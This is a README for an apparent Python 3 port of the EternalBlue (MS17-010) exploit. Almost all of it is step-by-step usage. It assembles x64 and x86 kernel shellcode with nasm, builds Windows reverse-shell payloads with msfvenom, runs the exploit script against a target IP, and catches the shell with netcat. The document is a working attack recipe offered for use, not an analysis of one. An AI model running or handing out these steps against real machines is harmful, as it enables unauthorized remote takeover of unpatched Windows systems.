# EternalBlue-in-Python3

## How to use

### Clone the repository

```
git clone https://github.com/Gabriel-Lima232/EternalBlue-in-Python3.git
```

### Compiling the shellcode(s)

### X64

```
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
```

### X86

```
nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
```

### Create a Bin

### X64

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windows -a x64 --format raw -o sc_x64_payload.bin
```

### X86

```
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windows -a x86 --format raw -o sc_x86_payload.bin
```

### Exploit

```
python3 eternal-blue.py TARGET-IP final.bin
in other term open the nc to recive the connection
```
